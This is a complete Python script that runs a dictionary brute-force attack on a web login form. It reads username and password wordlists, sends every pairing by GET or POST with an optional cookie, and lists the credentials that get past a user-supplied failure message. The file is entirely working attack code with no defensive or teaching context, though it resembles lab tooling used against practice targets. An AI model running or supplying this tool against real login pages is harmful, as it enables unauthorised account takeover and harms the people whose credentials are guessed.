import requests
from termcolor import colored

url = input('[*] Enter Page URL: ')
username_file = input('[*] Enter Username File To Use: ')
password_file = input('[*] Enter Password File To Use: ')
login_failure = input('[*] Input Login Failure Message: ')
submit_value = input('[*] Input Submit Button Value: ')
cookie_value = input('[*] Input Cookie Value (Click Enter If None): ')
print(colored('\n[*] Initiating Bruteforce Attack...\n', 'yellow'))


def cracking(usernamefile, passwordfile, weburl):
    successfulCredentials = []
    usernamelist = usernamefile.readlines()
    passwordlist = passwordfile.readlines()
    for username in usernamelist:
        for password in passwordlist:
            username = username.strip()
            password = password.strip()
            data = {'username': username,
                    'password': password,
                    'Login': 'Submit'}  # NAME OF FIELD: VALUE OF FIELD
            if cookie_value.strip() != '':
                response = requests.get(url, params={'username': username,
                                                     'password': password,
                                                     'Login': submit_value}, cookies={'Cookie': cookie_value})
            else:
                response = requests.post(weburl, data=data)
            if login_failure in response.content.decode():
                print(colored(f'[-] Failed Attempt: {username} // {password}', 'red'))
            else:
                print(colored(f'[+] Successful Attempt: {username} // {password}', 'green'))
                successfulCredentials.append((username, password))
    print(colored('\n[*] Bruteforce Attack Completed!\n', 'yellow'))
    if len(successfulCredentials) == 0:
        print(colored('[*] No Valid Credentials Found.', 'red'))
    else:
        print(colored('[*] List Of Valid Credentials:', 'green'))
        for username, password in successfulCredentials:
            print(colored(f"[*] Valid Credentials: {username} // {password}", 'green'))


with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
    cracking(usernames, passwords, url)
